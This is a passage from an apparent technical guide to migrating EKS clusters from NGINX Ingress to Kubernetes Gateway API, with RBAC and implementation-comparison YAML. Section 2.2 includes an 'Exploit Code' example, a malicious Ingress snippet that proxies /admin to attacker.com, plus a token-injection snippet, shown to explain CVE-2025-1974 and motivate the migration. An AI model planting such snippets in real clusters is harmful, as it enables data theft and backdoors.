import Tabs from '@theme/Tabs';
import TabItem from '@theme/TabItem';
import GatewayApiBenefits from '@site/src/components/GatewayApiBenefits';
import {
  DocumentStructureTable,
  RiskAssessmentTable,
  ArchitectureComparisonTable,
  RoleSeparationTable,
  GaStatusTable,
  FeatureComparisonMatrix,
  SolutionOverviewMatrix,
  ScenarioRecommendationTable,
  FeatureMappingTable,
  DifficultyComparisonTable,
  AwsCostTable,
  OpenSourceCostTable,
  CostComparisonTable,
  LatencyComparisonTable,
  RouteRecommendationTable,
  SolutionFeatureTable,
  RoadmapTimeline,
} from '@site/src/components/GatewayApiTables';

# Gateway API Adoption Guide

> **📌 Reference Versions**: Gateway API v1.4.0, Cilium v1.19.0, EKS 1.32, AWS LBC v3.0.0, Envoy Gateway v1.7.0

> 📅 **Published**: 2025-02-12 | ⏱️ **Reading Time**: Approximately 25 minutes

## 1. Overview

With the official End-of-Life (EOL) of NGINX Ingress Controller approaching in March 2026, transitioning to Kubernetes Gateway API has become a necessity rather than an option. This guide covers everything from understanding Gateway API architecture to comparing 5 major implementations (AWS LBC v3, Cilium, NGINX Gateway Fabric, Envoy Gateway, kGateway), deep-dive Cilium ENI mode configuration, step-by-step migration execution strategies, and performance benchmark planning.

### 1.1 Target Audience

- **EKS Cluster Administrators Operating NGINX Ingress Controller**: EOL response strategy development
- **Platform Engineers Planning Gateway API Migration**: Technology selection and PoC execution
- **Architects Evaluating Traffic Management Architecture Modernization**: Long-term roadmap design
- **Network Engineers Considering Cilium ENI Mode and Gateway API Integration**: eBPF-based high-performance networking

### 1.2 Document Structure

<DocumentStructureTable locale="en" />

:::info Reading Strategy
- **Quick Understanding**: Sections 1-3, 6 (approximately 10 minutes)
- **Technology Selection**: Sections 1-4, 6 (approximately 20 minutes)
- **Complete Migration**: Full document (approximately 25 minutes)
:::

---

## 2. NGINX Ingress Controller Retirement — Why Migration is Mandatory

### 2.1 EOL Timeline


**Key Event Details:**

- **March 2025**: IngressNightmare (CVE-2025-1974) discovered — Arbitrary NGINX configuration injection vulnerability through Snippets annotations accelerated retirement discussions in Kubernetes SIG Network
- **November 2025**: Kubernetes SIG Network announces official retirement of NGINX Ingress Controller. Citing insufficient maintainer resources (1-2 core maintainers) and Gateway API maturity as primary reasons
- **March 2026**: Official EOL — Security patches and bug fixes completely discontinued. Continued use in production environments may result in compliance violations

:::danger Required Actions
**After March 2026, NGINX Ingress Controller will not receive security vulnerability patches.** To maintain security certifications such as PCI-DSS, SOC 2, and ISO 27001, you must transition to Gateway API-based solutions.
:::

### 2.2 Security Vulnerability Analysis

**IngressNightmare (CVE-2025-1974) Attack Scenario:**

<Tabs>
  <TabItem value="attack-overview" label="Attack Overview" default>

  

  *Unauthenticated Remote Code Execution (RCE) attack vectors targeting Ingress NGINX Controller in a Kubernetes cluster. Both external and internal attackers can compromise the controller pod via Malicious Admission Review, gaining access to all pods in the cluster. (Source: [Wiz Research](https://www.wiz.io/blog/ingress-nginx-kubernetes-vulnerabilities))*

  </TabItem>
  <TabItem value="architecture" label="Controller Architecture">

  

  *Ingress NGINX Controller Pod internal architecture. The Admission Webhook's configuration validation process, where attackers inject malicious configurations into NGINX, is the core attack surface of CVE-2025-1974. (Source: [Wiz Research](https://www.wiz.io/blog/ingress-nginx-kubernetes-vulnerabilities))*

  </TabItem>
  <TabItem value="exploit-code" label="Exploit Code">

```yaml
apiVersion: networking.k8s.io/v1
kind: Ingress
metadata:
  name: malicious-ingress
  annotations:
    # Attacker injects arbitrary NGINX configuration
    nginx.ingress.kubernetes.io/configuration-snippet: |
      location /admin {
        proxy_pass http://malicious-backend.attacker.com;
        # Can bypass authentication, exfiltrate data, install backdoors
      }
spec:
  ingressClassName: nginx
  rules:
  - host: production-api.example.com
    http:
      paths:
      - path: /
        pathType: Prefix
        backend:
          service:
            name: production-service
            port:
              number: 80
```

  </TabItem>
</Tabs>

**Risk Assessment:**

<RiskAssessmentTable locale="en" />

:::warning If Currently Operating
For existing NGINX Ingress environments, we recommend immediately applying admission controller policies that prohibit the use of `nginx.ingress.kubernetes.io/configuration-snippet` and `nginx.ingress.kubernetes.io/server-snippet` annotations.
:::

### 2.3 Structural Resolution of Vulnerabilities through Gateway API Adoption

Gateway API fundamentally resolves the structural vulnerabilities of NGINX Ingress.

<ArchitectureComparisonTable locale="en" />

<Tabs>
<TabItem value="nginx" label="❌ NGINX Ingress Vulnerabilities" default>

**1. Configuration Snippet Injection Attack**

NGINX Ingress allows arbitrary string injection via annotations, creating severe security risks:


```yaml
# ❌ NGINX Ingress — arbitrary string injection possible
annotations:
  nginx.ingress.kubernetes.io/configuration-snippet: |
    # Adjacent service credential theft possible (CVE-2021-25742)
    proxy_set_header Authorization "stolen-token";
```

**2. All Permissions Concentrated in a Single Resource**

- Routing, TLS, security, and extension settings all mixed in one Ingress resource
- Per-annotation RBAC separation is impossible — full Ingress permission or none
- Developers who only need routing access also get TLS/security modification rights

**3. Vendor Annotation Dependency**

- Non-standard features added via vendor-specific annotations → **portability lost**
- Debugging annotation conflicts is difficult
- Growing complexity managing 100+ vendor annotations

These structural issues make NGINX Ingress unable to meet production security requirements.

</TabItem>
<TabItem value="gateway" label="✅ Gateway API Resolution">

**1. 3-Tier Role Separation Eliminates Snippets**


Each team manages resources only within their permission scope — arbitrary configuration injection paths are eliminated.

```yaml
# Infrastructure Team: GatewayClass (Cluster-level)
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
  name: infrastructure-team
rules:
- apiGroups: ["gateway.networking.k8s.io"]
  resources: ["gatewayclasses"]
  verbs: ["create", "update", "delete"]
---
# Platform Team: Gateway (Namespace-level)
apiVersion: rbac.authorization.k8s.io/v1
kind: Role
metadata:
  name: platform-team
  namespace: platform-system
rules:
- apiGroups: ["gateway.networking.k8s.io"]
  resources: ["gateways"]
  verbs: ["create", "update", "delete"]
---
# Application Team: HTTPRoute Only (Routing rules only)
apiVersion: rbac.authorization.k8s.io/v1
kind: Role
metadata:
  name: app-team
  namespace: app-namespace
rules:
- apiGroups: ["gateway.networking.k8s.io"]
  resources: ["httproutes"]
  verbs: ["create", "update", "delete"]
```

**2. CRD Schema-Based Structural Validation**

All fields are pre-defined with OpenAPI schemas, making arbitrary configuration injection fundamentally impossible:


```yaml
# ✅ Gateway API — only schema-validated fields allowed
apiVersion: gateway.networking.k8s.io/v1
kind: HTTPRoute
spec:
  rules:
  - matches:
    - path:
        type: PathPrefix
        value: /api
    filters:
    - type: RequestHeaderModifier  # Only predefined filters allowed
      requestHeaderModifier:
        add:
        - name: X-Custom-Header
          value: production
```

**3. Safe Extension via Policy Attachment Pattern**

Extension functionality is separated into Policy resources with RBAC control:


```yaml
# Cilium's CiliumNetworkPolicy for L7 security policies
apiVersion: cilium.io/v2
kind: CiliumNetworkPolicy
metadata:
  name: api-rate-limiting
spec:
  endpointSelector:
    matchLabels:
      app: api-gateway
  ingress:
  - fromEndpoints:
    - matchLabels:
        role: frontend
    toPorts:
    - ports:
      - port: "80"
        protocol: TCP
      rules:
        http:
        - method: "GET"
          path: "/api/.*"
          rateLimit:
            requestsPerSecond: 100
```

</TabItem>
</Tabs>

:::info Active Community Support
- **15+ production implementations**: AWS, Google Cloud, Cilium, Envoy, NGINX, Istio, etc.
- **Regular quarterly releases**: Including GA resources as of v1.4.0
- **Official CNCF project**: Led by Kubernetes SIG Network
:::

---

## 3. Gateway API — Next-Generation Traffic Management Standard

### 3.1 Gateway API Architecture


*Source: [Kubernetes Gateway API Official Documentation](https://gateway-api.sigs.k8s.io/) — Three roles (Infrastructure Provider, Cluster Operator, Application Developer) managing GatewayClass, Gateway, and HTTPRoute respectively*

:::tip Detailed Comparison
For a detailed architecture comparison between NGINX Ingress and Gateway API, see [2.3 Structural Resolution of Vulnerabilities through Gateway API Adoption](#23-structural-resolution-of-vulnerabilities-through-gateway-api-adoption) with tabbed breakdowns.
:::

### 3.2 3-Tier Resource Model

Gateway API separates responsibilities with the following hierarchy:

<Tabs>
  <TabItem value="overview" label="Role Overview" default>

  

  *Source: [Kubernetes Gateway API Official Documentation](https://gateway-api.sigs.k8s.io/concepts/api-overview/) — GatewayClass → Gateway → xRoute → Service hierarchy*

  <RoleSeparationTable locale="en" />

  </TabItem>
  <TabItem value="infra" label="Infrastructure (GatewayClass)">

  **Infrastructure Team: GatewayClass-exclusive permissions (ClusterRole)**

  GatewayClass is a cluster-scoped resource that only the infrastructure team can create/modify. It controls controller selection and global policies.

  ```yaml
  apiVersion: rbac.authorization.k8s.io/v1
  kind: ClusterRole
  metadata:
    name: infrastructure-gateway-manager
  rules:
  - apiGroups: ["gateway.networking.k8s.io"]
    resources: ["gatewayclasses"]
    verbs: ["get", "list", "watch", "create", "update", "patch", "delete"]
  ```

  </TabItem>
  <TabItem value="platform" label="Platform (Gateway)">

  **Platform Team: Gateway management permissions (Role — namespace-scoped)**

  Gateway is a namespace-scoped resource. The platform team manages listener configuration, TLS certificates, and load balancer settings.

  ```yaml
  apiVersion: rbac.authorization.k8s.io/v1
  kind: Role
  metadata:
    name: platform-gateway-manager
    namespace: gateway-system
  rules:
  - apiGroups: ["gateway.networking.k8s.io"]
    resources: ["gateways"]
    verbs: ["get", "list", "watch", "create", "update", "patch", "delete"]
  - apiGroups: [""]
    resources: ["secrets"]  # TLS certificate management
    verbs: ["get", "list"]
  ```

  </TabItem>
  <TabItem value="app" label="App Team (HTTPRoute)">

  **Application Team: HTTPRoute only (Role — namespace-scoped)**

  Application teams manage only HTTPRoutes and ReferenceGrants in their own namespace. They cannot access GatewayClass or Gateway resources.

  ```yaml
  apiVersion: rbac.authorization.k8s.io/v1
  kind: Role
  metadata:
    name: app-route-manager
    namespace: production-app
  rules:
  - apiGroups: ["gateway.networking.k8s.io"]
    resources: ["httproutes", "referencegrants"]
    verbs: ["get", "list", "watch", "create", "update", "patch", "delete"]
  - apiGroups: [""]
    resources: ["services"]
    verbs: ["get", "list"]
  ```

  </TabItem>
</Tabs>

### 3.3 GA Status (v1.4.0)

Gateway API is divided into Standard Channel and Experimental Channel, with varying maturity levels per resource:

<GaStatusTable locale="en" />

:::warning Experimental Channel Caution
Alpha-status resources have **no API compatibility guarantees**, with possible field changes or deletions during minor version upgrades. For production environments, we recommend using only GA/Beta resources from the Standard channel.
:::

### 3.4 Key Benefits

Explore the 6 key benefits of Gateway API through visual diagrams and YAML examples.

<GatewayApiBenefits />

## 4. Gateway API Implementation Comparison - AWS Native vs Open Source

This section provides detailed comparisons of 5 major Gateway API implementations. Understanding the features, strengths, and weaknesses of each solution helps you make the optimal choice for your organization.

### 4.1 Solution Overview Comparison

The following matrix compares the key features, limitations, and use cases of 5 Gateway API implementations.

<SolutionOverviewMatrix locale="en" />

### 4.2 Comprehensive Comparison Table

<FeatureComparisonMatrix locale="en" />

### 4.3 NGINX Feature Mapping

Compare how 8 key NGINX Ingress Controller features are implemented across Gateway API solutions.

<FeatureMappingTable locale="en" />

**Legend**:
- ✅ Native support (no additional tools needed)
- ⚠️ Partial support or additional configuration required
- ❌ Not supported (separate solution needed)

### 4.4 Implementation Difficulty Comparison

<DifficultyComparisonTable locale="en" />

### 4.5 Cost Impact Analysis

<CostComparisonTable locale="en" />

:::tip Cost Optimization Tips
- **If 3+ WAF features are needed**, AWS Native is cost-effective. Multiple rules can be bundled into a single WebACL
- **If only 1-2 are needed**, open source solutions (Cilium, Envoy Gateway) can implement them at no additional cost
- **For latency-sensitive workloads**, open source is advantageous as processing happens at the kernel/eBPF level without WAF rule evaluation overhead
- **When using Lambda Authorizer**, watch out for p99 latency spikes from cold starts. Consider configuring Provisioned Concurrency
:::

### 4.6 Feature Implementation Code Examples

Compare implementation approaches across solutions. Click tabs to view each solution's code.

#### 1. Authentication (Basic Auth Alternative)

<Tabs>
<TabItem value="aws" label="AWS Native (LBC v3)" default>

```yaml
# AWS LBC v3's native JWT validation
apiVersion: gateway.networking.k8s.io/v1
kind: HTTPRoute
metadata:
  name: jwt-protected-route
  namespace: production
spec:
  parentRefs:
    - name: production-gateway
  rules:
    - matches:
        - path:
            type: PathPrefix
            value: /api
      filters:
        - type: ExtensionRef
          extensionRef:
            group: eks.amazonaws.com
            kind: JWTAuthorizer
            name: cognito-authorizer
      backendRefs:
        - name: api-service
          port: 8080

---
# JWTAuthorizer CRD (LBC v3 extension)
apiVersion: eks.amazonaws.com/v1
kind: JWTAuthorizer
metadata:
  name: cognito-authorizer
spec:
  issuer: https://cognito-idp.us-west-2.amazonaws.com/us-west-2_ABC123
  audiences:
    - api-gateway-client
  claimsToHeaders:
    - claim: sub
      header: x-user-id
    - claim: email
      header: x-user-email
```

</TabItem>
<TabItem value="cilium" label="Cilium">

:::warning Limitation
Cilium does not natively support JWT/OIDC authentication. Use CiliumEnvoyConfig to configure Envoy's ext_authz filter, or deploy a separate auth service (e.g., OAuth2 Proxy).
:::

</TabItem>
<TabItem value="nginx" label="NGINX Gateway Fabric">

:::warning Limitation
NGINX Gateway Fabric does not support native JWT validation. Combine UpstreamSettingsPolicy with an external authentication service.
:::

</TabItem>
<TabItem value="envoy" label="Envoy Gateway">

```yaml
apiVersion: gateway.envoyproxy.io/v1alpha1
kind: SecurityPolicy
metadata:
  name: ext-auth
  namespace: production
spec:
  targetRefs:
    - group: gateway.networking.k8s.io
      kind: HTTPRoute
      name: api-route
  extAuth:
    http:
      service:
        name: auth-service
        port: 8080
        # auth-service returns HTTP 200 or 401
      headersToBackend:
        - x-user-id
        - x-user-role
      backendRefs:
        - name: auth-service
          port: 8080
```

</TabItem>
<TabItem value="kgateway" label="kGateway">

```yaml
apiVersion: gateway.kgateway.io/v1alpha1
kind: RouteOption
metadata:
  name: jwt-auth
  namespace: production
spec:
  targetRefs:
    - group: gateway.networking.k8s.io
      kind: HTTPRoute
      name: api-route
  jwt:
    providers:
      - name: keycloak
        issuer: https://keycloak.example.com/auth/realms/production
        audiences:
          - api-gateway
        jwksUri: https://keycloak.example.com/auth/realms/production/protocol/openid-connect/certs
        claimsToHeaders:
          - claim: sub
            header: x-user-id
          - claim: groups
            header: x-user-groups
```

</TabItem>
</Tabs>

#### 2. Rate Limiting

<Tabs>
<TabItem value="aws" label="AWS Native (LBC v3)" default>

:::warning Limitation
AWS Native (LBC v3) does not support native gateway-level Rate Limiting. Use AWS WAF Rate-based Rules to implement IP-based request throttling.
:::

```yaml
# Associate WAF Rate-based Rule with ALB
apiVersion: gateway.networking.k8s.io/v1
kind: Gateway
metadata:
  name: production-gateway
  annotations:
    # Rate limiting WAF ACL ARN
    aws.load-balancer.waf-acl-arn: arn:aws:wafv2:us-west-2:123456789012:regional/webacl/rate-limit/a1b2c3d4
spec:
  gatewayClassName: aws-alb
  listeners:
    - name: http
      port: 80
      protocol: HTTP
```

**Create WAF Rate-based Rule with ACK (AWS Controllers for Kubernetes):**

The ACK WAFv2 controller enables declarative management of WAF resources via Kubernetes manifests.

**Enable ACK via EKS Capabilities (Recommended):**

With EKS Capabilities (GA November 2025), ACK controllers run as a fully managed AWS service. Controllers execute on AWS-managed infrastructure, so no additional Pods are deployed to your worker nodes.

```bash
# 1. Create IAM Capability Role
aws iam create-role \
  --role-name EKS-ACK-Capability-Role \
  --assume-role-policy-document '{
    "Version": "2012-10-17",
    "Statement": [{
      "Effect": "Allow",
      "Principal": { "Service": "eks.amazonaws.com" },
      "Action": "sts:AssumeRole",
      "Condition": {
        "StringEquals": { "aws:SourceAccount": "<ACCOUNT_ID>" }
      }
    }]
  }'

# Attach WAFv2 permissions policy
aws iam put-role-policy \
  --role-name EKS-ACK-Capability-Role \
  --policy-name ACK-WAFv2-Policy \
  --policy-document '{
    "Version": "2012-10-17",
    "Statement": [{
      "Effect": "Allow",
      "Action": ["wafv2:*"],
      "Resource": "*"
    }]
  }'

# 2. Create ACK Capability on EKS cluster
aws eks create-capability \
  --cluster-name my-eks-cluster \
  --capability-type ACK \
  --capability-configuration '{
    "capabilityRoleArn": "arn:aws:iam::<ACCOUNT_ID>:role/EKS-ACK-Capability-Role"
  }'

# 3. Verify CRD registration
kubectl get crds | grep wafv2
```

<details>
<summary>Alternative: Direct Helm Installation (Non-EKS Environments)</summary>

For non-EKS environments or when you need direct control over the controller, install via Helm.

```bash
helm install ack-wafv2-controller \
  oci://public.ecr.aws/aws-controllers-k8s/wafv2-chart \
  --namespace ack-system \
  --create-namespace \
  --set aws.region=ap-northeast-2
```

This approach deploys controllers as Pods on your worker nodes and uses IRSA (IAM Roles for Service Accounts) for permission management.

</details>

```yaml
# ACK WAFv2 WebACL - Rate-based Rule definition
apiVersion: wafv2.services.k8s.aws/v1alpha1
kind: WebACL
metadata:
  name: rate-limit-acl
  namespace: production
spec:
  name: rate-limit-acl
  scope: REGIONAL
  defaultAction:
    allow: {}
  rules:
    - name: ip-rate-limit
      priority: 1
      action:
        block: {}
      statement:
        rateBasedStatement:
          limit: 500            # Max requests per 5-minute window (100~2,000,000,000)
          aggregateKeyType: IP  # IP-based aggregation
      visibilityConfig:
        sampledRequestsEnabled: true
        cloudWatchMetricsEnabled: true
        metricName: ip-rate-limit
  visibilityConfig:
    sampledRequestsEnabled: true
    cloudWatchMetricsEnabled: true
    metricName: rate-limit-acl
```

```yaml
# Connect created WebACL ARN to Gateway
# After WebACL creation, get ARN from status.ackResourceMetadata.arn:
#   kubectl get webacl rate-limit-acl -n production \
#     -o jsonpath='{.status.ackResourceMetadata.arn}'
apiVersion: gateway.networking.k8s.io/v1
kind: Gateway
metadata:
  name: production-gateway
  annotations:
    aws.load-balancer.waf-acl-arn: <WebACL ARN>
spec:
  gatewayClassName: aws-alb
  listeners:
    - name: http
      port: 80
      protocol: HTTP
```

:::note ACK WAFv2 Controller Requirements
- The ACK WAFv2 controller requires IAM permissions such as `wafv2:CreateWebACL`, `wafv2:UpdateWebACL`, `wafv2:DeleteWebACL`, `wafv2:GetWebACL`
- **EKS Capabilities**: Attach WAFv2 permissions to the IAM Capability Role. Controllers run on AWS-managed infrastructure
- **Helm installation**: Grant least-privilege access via IRSA (IAM Roles for Service Accounts) or EKS Pod Identity
- WebACL and ALB must be in the same region
:::

</TabItem>
<TabItem value="cilium" label="Cilium">

```yaml
apiVersion: cilium.io/v2
kind: CiliumNetworkPolicy
metadata:
  name: api-rate-limit
spec:
  endpointSelector:
    matchLabels:
      app: api-gateway
  ingress:
  - toPorts:
    - ports:
      - port: "80"
      rules:
        http:
        - method: "GET"
          path: "/api/.*"
          rateLimit:
            requestsPerSecond: 100
            burst: 150
```

</TabItem>
<TabItem value="nginx" label="NGINX Gateway Fabric">

```yaml
apiVersion: gateway.nginx.org/v1alpha1
kind: NginxProxy
metadata:
  name: rate-limiting-config
spec:
  rateLimiting:
    key: ${binary_remote_addr}
    zoneSize: 10m
    rate: 10r/s  # 10 requests per second per IP
```

</TabItem>
<TabItem value="envoy" label="Envoy Gateway">

```yaml
apiVersion: gateway.envoyproxy.io/v1alpha1
kind: BackendTrafficPolicy
metadata:
  name: rate-limit
spec:
  targetRefs:
    - group: gateway.networking.k8s.io
      kind: HTTPRoute
      name: api-route
  rateLimit:
    type: Global
    global:
      rules:
        - limit:
            requests: 1000
            unit: Second
```

</TabItem>
<TabItem value="kgateway" label="kGateway">

```yaml
apiVersion: gateway.kgateway.io/v1alpha1
kind: RouteOption
metadata:
  name: rate-limit
  namespace: production
spec:
  targetRefs:
    - group: gateway.networking.k8s.io
      kind: HTTPRoute
      name: api-route
  rateLimitConfigs:
    - actions:
        - genericKey:
            descriptorValue: api-rate-limit
      limits:
        - key: generic_key
          value: api-rate-limit
          requestsPerUnit: 1000
          unit: MINUTE
```

</TabItem>
</Tabs>

#### 3. IP Allowlist

<Tabs>
<TabItem value="aws" label="AWS Native (LBC v3)" default>

```yaml
# Associate WAF with ALB (LBC v3)
apiVersion: gateway.networking.k8s.io/v1
kind: Gateway
metadata:
  name: production-gateway
  annotations:
    aws.load-balancer.waf-acl-arn: arn:aws:wafv2:us-west-2:123456789012:regional/webacl/ip-allowlist/a1b2c3d4
spec:
  gatewayClassName: aws-alb
  listeners:
    - name: http
      port: 80
      protocol: HTTP
```

**Create WAF IP Allowlist with ACK (AWS Controllers for Kubernetes):**

The ACK WAFv2 controller enables declarative management of IPSet and WebACL via Kubernetes manifests.

```yaml
# 1. ACK WAFv2 IPSet - Define allowed IP list
apiVersion: wafv2.services.k8s.aws/v1alpha1
kind: IPSet
metadata:
  name: allowed-ips
  namespace: production
spec:
  name: allowed-ips
  scope: REGIONAL
  ipAddressVersion: IPV4
  addresses:
    - "10.0.0.0/8"        # VPC internal
    - "192.168.1.0/24"    # Office network
    - "203.0.113.100/32"  # Specific allowed IP
```

```yaml
# 2. ACK WAFv2 WebACL - IPSet-based Allowlist rule
# After IPSet creation, get ARN from status.ackResourceMetadata.arn:
#   kubectl get ipset allowed-ips -n production \
#     -o jsonpath='{.status.ackResourceMetadata.arn}'
apiVersion: wafv2.services.k8s.aws/v1alpha1
kind: WebACL
metadata:
  name: ip-allowlist-acl
  namespace: production
spec:
  name: ip-allowlist-acl
  scope: REGIONAL
  defaultAction:
    block: {}  # Block by default, only allowlisted IPs pass
  rules:
    - name: allow-trusted-ips
      priority: 1
      action:
        allow: {}
      statement:
        ipSetReferenceStatement:
          arn: <IPSet ARN>  # ARN of the allowed-ips IPSet
      visibilityConfig:
        sampledRequestsEnabled: true
        cloudWatchMetricsEnabled: true
        metricName: allow-trusted-ips
  visibilityConfig:
    sampledRequestsEnabled: true
    cloudWatchMetricsEnabled: true
    metricName: ip-allowlist-acl
```

```yaml
# 3. Connect created WebACL ARN to Gateway
# After WebACL creation, get ARN from status.ackResourceMetadata.arn:
#   kubectl get webacl ip-allowlist-acl -n production \
#     -o jsonpath='{.status.ackResourceMetadata.arn}'
apiVersion: gateway.networking.k8s.io/v1
kind: Gateway
metadata:
  name: production-gateway
  annotations:
    aws.load-balancer.waf-acl-arn: <WebACL ARN>
spec:
  gatewayClassName: aws-alb
  listeners:
    - name: http
      port: 80
      protocol: HTTP
```

:::note ACK WAFv2 IPSet Management Tips
- Updating the `addresses` field in IPSet causes the ACK controller to automatically sync the AWS WAF IPSet
- Combined with GitOps (ArgoCD/Flux), IP changes can be managed via PR-based workflows
- IPSet and WebACL must be in the same region; `wafv2:*IPSet*`, `wafv2:*WebACL*` permissions are required (EKS Capabilities: IAM Capability Role / Helm: IRSA)
:::

</TabItem>
<TabItem value="cilium" label="Cilium">

```yaml
apiVersion: cilium.io/v2
kind: CiliumNetworkPolicy
metadata:
  name: ip-allowlist
spec:
  endpointSelector:
    matchLabels:
      app: api-gateway
  ingress:
  - fromCIDR:
    - 203.0.113.0/24
    - 198.51.100.0/24
    toPorts:
    - ports:
      - port: "80"
        protocol: TCP
```

</TabItem>
<TabItem value="nginx" label="NGINX Gateway Fabric">

```yaml
apiVersion: gateway.nginx.org/v1alpha1
kind: NginxProxy
metadata:
  name: ip-filtering
spec:
  ipFiltering:
    ipv4:
      - 203.0.113.0/24
      - 198.51.100.0/24
    mode: allow  # or deny for blocklist
```

</TabItem>
<TabItem value="envoy" label="Envoy Gateway">

```yaml
apiVersion: gateway.envoyproxy.io/v1alpha1
kind: SecurityPolicy
metadata:
  name: ip-allowlist
spec:
  targetRefs:
    - group: gateway.networking.k8s.io
      kind: Gateway
      name: production-gateway
  authorization:
    rules:
      - action: ALLOW
        from:
          - source:
              cidr:
                - 203.0.113.0/24
                - 198.51.100.0/24
```

</TabItem>
<TabItem value="kgateway" label="kGateway">

:::warning Limitation
kGateway implements IP filtering through Kubernetes NetworkPolicy or RouteOption with external authorization.
:::

</TabItem>
</Tabs>

#### 4. URL Rewrite

Standard Gateway API feature supported by all implementations.

```yaml
apiVersion: gateway.networking.k8s.io/v1
kind: HTTPRoute
metadata:
  name: url-rewrite
spec:
  rules:
  - matches:
    - path:
        type: PathPrefix
        value: /old-api
    filters:
    - type: URLRewrite
      urlRewrite:
        path:
          type: ReplacePrefixMatch
          replacePrefixMatch: /new-api
    backendRefs:
    - name: api-service
      port: 8080
```

#### 5. Request Body Size Limit

<Tabs>
<TabItem value="aws" label="AWS Native (LBC v3)" default>

:::warning Limitation
Use AWS WAF Rules to limit request body size.
:::

```yaml
# Associate WAF Body Size Limit Rule with ALB
apiVersion: gateway.networking.k8s.io/v1
kind: Gateway
metadata:
  name: production-gateway
  annotations:
    aws.load-balancer.waf-acl-arn: arn:aws:wafv2:us-west-2:123456789012:regional/webacl/body-size-limit/a1b2c3d4
spec:
  gatewayClassName: aws-alb
  listeners:
    - name: http
      port: 80
      protocol: HTTP
```

**Create WAF Body Size Rule with ACK (AWS Controllers for Kubernetes):**

```yaml
# ACK WAFv2 WebACL - Body Size Limit Rule definition
apiVersion: wafv2.services.k8s.aws/v1alpha1
kind: WebACL
metadata:
  name: body-size-limit-acl
  namespace: production
spec:
  name: body-size-limit-acl
  scope: REGIONAL
  defaultAction:
    allow: {}
  rules:
    - name: block-large-body
      priority: 1
      action:
        block: {}
      statement:
        sizeConstraintStatement:
          fieldToMatch:
            body:
              oversizeHandling: MATCH  # Also match oversized bodies
          comparisonOperator: GT
          size: 10485760              # 10MB (in bytes)
          textTransformations:
            - priority: 0
              type: NONE
      visibilityConfig:
        sampledRequestsEnabled: true
        cloudWatchMetricsEnabled: true
        metricName: block-large-body
  visibilityConfig:
    sampledRequestsEnabled: true
    cloudWatchMetricsEnabled: true
    metricName: body-size-limit-acl
```

:::note Consolidate Rules into a Single WebACL
If using IP Allowlist, Rate Limiting, and Body Size limits together, you don't need separate WebACLs for each — **consolidate multiple rules in a single WebACL differentiated by `priority`**. Only one WebACL can be associated per ALB, so consolidated management is essential.
:::

</TabItem>
<TabItem value="cilium" label="Cilium">

:::warning Limitation
Cilium Gateway API does not provide a separate body size limit CRD. Configure via CiliumEnvoyConfig buffer filter or handle at the backend application level.
:::

</TabItem>
<TabItem value="nginx" label="NGINX Gateway Fabric">

```yaml
apiVersion: gateway.nginx.org/v1alpha1
kind: NginxProxy
metadata:
  name: body-size-limit
spec:
  clientMaxBodySize: 8m  # 8MB limit
```

</TabItem>
<TabItem value="envoy" label="Envoy Gateway">

```yaml
apiVersion: gateway.envoyproxy.io/v1alpha1
kind: ClientTrafficPolicy
metadata:
  name: body-size-limit
spec:
  targetRefs:
    - group: gateway.networking.k8s.io
      kind: Gateway
      name: production-gateway
  http:
    maxRequestBodySize: 8388608  # 8MB in bytes
```

</TabItem>
<TabItem value="kgateway" label="kGateway">

:::warning Limitation
kGateway does not directly support body size limits in RouteOption CRD. Implement via backend service or Envoy filter extensions.
:::

</TabItem>
</Tabs>

#### 6. Custom Error Pages

<Tabs>
<TabItem value="aws" label="AWS Native (LBC v3)" default>

```yaml
apiVersion: gateway.networking.k8s.io/v1
kind: HTTPRoute
metadata:
  name: custom-error
spec:
  rules:
  - matches:
    - path:
        type: PathPrefix
        value: /maintenance
    filters:
    - type: ExtensionRef
      extensionRef:
        group: alb.networking.aws.com
        kind: FixedResponse
        name: maintenance-page
---
apiVersion: alb.networking.aws.com/v1
kind: FixedResponse
metadata:
  name: maintenance-page
spec:
  statusCode: 503
  contentType: text/html
  body: |
    <html>
      <body>
        <h1>Under Maintenance</h1>
        <p>We'll be back soon!</p>
      </body>
    </html>
```

</TabItem>
<TabItem value="cilium" label="Cilium">

:::warning Limitation
Cilium Gateway API does not support native custom error pages. Deploy a separate error page service and route via HTTPRoute.
:::

</TabItem>
<TabItem value="nginx" label="NGINX Gateway Fabric">

:::warning Limitation
NGINX Gateway Fabric handles custom errors through SnippetsPolicy or separate error service routing.
:::

</TabItem>
<TabItem value="envoy" label="Envoy Gateway">

```yaml
apiVersion: gateway.networking.k8s.io/v1
kind: HTTPRoute
metadata:
  name: custom-error
spec:
  rules:
  - matches:
    - path:
        type: PathPrefix
        value: /error
    filters:
    - type: ExtensionRef
      extensionRef:
        group: gateway.envoyproxy.io
        kind: DirectResponse
        name: error-response
---
apiVersion: gateway.envoyproxy.io/v1alpha1
kind: DirectResponse
metadata:
  name: error-response
spec:
  statusCode: 503
  body: "Service temporarily unavailable"
```

</TabItem>
<TabItem value="kgateway" label="kGateway">

:::warning Limitation
kGateway can configure custom responses using RouteOption transformation or faultInjection.
:::

</TabItem>
</Tabs>

#### 7. Header-Based Routing

Standard Gateway API feature supported by all implementations.

```yaml
apiVersion: gateway.networking.k8s.io/v1
kind: HTTPRoute
metadata:
  name: header-routing
spec:
  rules:
  # Route to beta backend for beta users
  - matches:
    - headers:
      - name: X-User-Type
        value: beta
    backendRefs:
    - name: beta-backend
      port: 8080

  # Route to production backend for others
  - backendRefs:
    - name: prod-backend
      port: 8080
```

#### 8. Session Affinity (Cookie-Based)

<Tabs>
<TabItem value="aws" label="AWS Native (LBC v3)" default>

```yaml
apiVersion: gateway.networking.k8s.io/v1
kind: Gateway
metadata:
  name: production-gateway
  annotations:
    # Enable ALB stickiness
    alb.ingress.kubernetes.io/target-group-attributes: stickiness.enabled=true,stickiness.lb_cookie.duration_seconds=86400
spec:
  gatewayClassName: aws-alb
  listeners:
  - name: http
    port: 80
    protocol: HTTP
```

</TabItem>
<TabItem value="cilium" label="Cilium">

:::warning Limitation
Cilium does not support native cookie-based session affinity. Configure Envoy's consistent hashing via CiliumEnvoyConfig.
:::

</TabItem>
<TabItem value="nginx" label="NGINX Gateway Fabric">

```yaml
apiVersion: gateway.nginx.org/v1alpha1
kind: UpstreamSettingsPolicy
metadata:
  name: session-affinity
spec:
  targetRef:
    group: ""
    kind: Service
    name: backend-service
  sessionAffinity:
    cookieName: BACKEND_SESSION
    cookieExpires: 1h
```

</TabItem>
<TabItem value="envoy" label="Envoy Gateway">

```yaml
apiVersion: gateway.envoyproxy.io/v1alpha1
kind: BackendTrafficPolicy
metadata:
  name: session-affinity
